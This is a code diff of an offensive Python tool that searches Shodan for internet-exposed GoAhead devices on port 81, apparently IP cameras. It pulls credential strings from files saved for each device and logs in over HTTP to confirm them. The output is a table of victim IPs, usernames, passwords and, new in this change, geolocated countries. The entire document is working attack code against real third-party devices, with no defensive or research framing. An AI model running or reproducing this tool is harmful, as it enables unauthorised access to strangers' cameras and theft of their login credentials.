@@ -5,6 +5,9 @@ from colorama import init, Fore, Back
 from progress.bar import IncrementalBar
 from prettytable import PrettyTable
 from requests.auth import HTTPDigestAuth
+from geocoder import ip
+
+#shodan, os, urllib.request, requests, progress, prettytable, geocoder
 
 os.system('clear || cls')
 
@@ -20,21 +23,26 @@ except:
 init(autoreset=True)
 
 if os.path.exists('api_key.config') == False:
- inn = input("Введите ключ API: ")
- if inn == '':
-  exit()
- file = open('api_key.config', 'w')
- file.write(inn)
- file.close()
-else:
-  pass
+  while True:
+    api = input('Enter valid API key: ')
+    try:
+     if api == '':
+      pass
+     else:
+      key = shodan.Shodan(api)
+      key.search('realm="GoAhead", domain=":81"')
+      with open('api_key.config', 'w') as e:
+       e.write(api)
+      os.system('cls || clear')
+      break
+    except:
+      print("Wrong API key! Try again.\n")
 
 key = open('api_key.config', 'r').read()
 
 api = shodan.Shodan(key)
 
 num_of_vulnerable = []
-locations = []
 ips = []
 
 def st():
@@ -48,8 +56,6 @@ def st():
 
  for result in results['matches']:
   ips.append(format(result['ip_str']))
-  ka = result['location']
-  locations.append(f"{format(ka['city'])}, {format(ka['country_name'])}")
 
  for ip in list(set(ips)):
   try:
@@ -76,15 +82,15 @@ if len(num_of_vulnerable) >= int('1'):
 else:
   taro2 = Fore.LIGHTRED_EX + str(len(num_of_vulnerable))
 
-print(f'Devices tested: {len(list(set(ips)))}\nVulnerable devices: {taro2}\n')
+#print(f'Checked devices: {len(list(set(ips)))}\nVulnerable devices: {taro2}\n')
 
-th = ['IP', 'USERNAME', 'PASSWORD']
+th = ['IP', 'USERNAME', 'PASSWORD', 'COUNTRY']
 td = []
 
 if len(num_of_vulnerable) >= int('1'):
  s = session()
 
- raz = 0
+ #raz = 0
  with IncrementalBar('Processing', max=len(num_of_vulnerable)) as bar:
 
   for ipi in num_of_vulnerable:
@@ -100,13 +106,15 @@ if len(num_of_vulnerable) >= int('1'):
       print(r)
      for i in range(len(words)-1):
       try:
+       ad = ip(ipi)
        page = s.get(url=f'http://{ipi}:81', auth=(words[i], words[i+1]), timeout=10)
        if page.status_code == 200:
         td.append(ipi)
         td.append(words[i])
         td.append(words[i+1])
-        os.remove(f'camera_{ip}.ini')
-        raz += 1
+        td.append(ad.country)
+        #os.remove(f'camera_{ipi}.ini')
+        #raz += 1
         bar.next()
         break
 
@@ -115,7 +123,8 @@ if len(num_of_vulnerable) >= int('1'):
         td.append(ipi)
         td.append(words[i])
         td.append('')
-        os.remove(f'camera_{ip}.ini')
+        td.append(ad.country)
+        #os.remove(f'camera_{ipi}.ini')
         bar.next()
         break
       except Exception as e:
@@ -134,4 +143,8 @@ if len(num_of_vulnerable) >= int('1'):
     td_data = td_data[columns:]
  print(f'\n{table}\n')
 else:
- print("No vulnerable devices was found!\n")
+ #print("No vulnerable devices was found!\n")
+ taro = Fore.LIGHTRED_EX + str(len(num_of_vulnerable))
+ print('Checked devices:', Fore.LIGHTCYAN_EX + str(len(list(set(ips)))))
+ print('Vulnerable devices:', taro, '\n')
+ print('Vulnerable devices not found! Please try again later.')
